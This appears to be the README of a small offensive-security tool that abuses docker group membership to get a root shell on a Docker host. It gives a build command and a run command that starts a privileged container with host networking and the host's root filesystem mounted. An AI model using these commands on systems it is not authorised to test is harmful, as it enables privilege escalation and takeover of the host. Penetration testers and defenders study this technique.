# dockergroupabuse

Abusing the `docker` group to get root shells on minimal images that might be stored on a Docker host.

## Usage

Build the Docker image on the host using the Dockerfiles provided.

```
docker build -t [image-name] .
docker run --privileged --network host -itv /:/host [image-name]
```
